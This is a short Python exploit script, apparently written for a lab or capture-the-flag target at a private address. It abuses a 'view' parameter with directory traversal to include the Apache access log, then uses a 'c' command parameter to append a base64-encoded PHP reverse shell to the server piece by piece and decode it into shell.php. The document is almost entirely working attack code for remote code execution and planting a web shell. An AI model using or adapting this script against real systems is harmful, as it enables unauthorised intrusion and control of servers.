import requests
import base64

url = "http://10.10.35.147/"
with open('revshell.php') as handle:
	lines = [ base64.b64encode(x.strip()) for x in handle.readlines()]
for line in lines:
	params = {
		"view" : "?view=dog/../../../../../../../../var/log/apache2/access.log",
		"ext" : "",
		"c" : "echo {} >> revshell.php".format(line)
	}

	r = requests.get(url,params = params)

params = {
		"view" : "?view=dog/../../../../../../../../var/log/apache2/access.log",
		"ext" : "",
		"c" : "base64 -d revshell.php > shell.php"
	}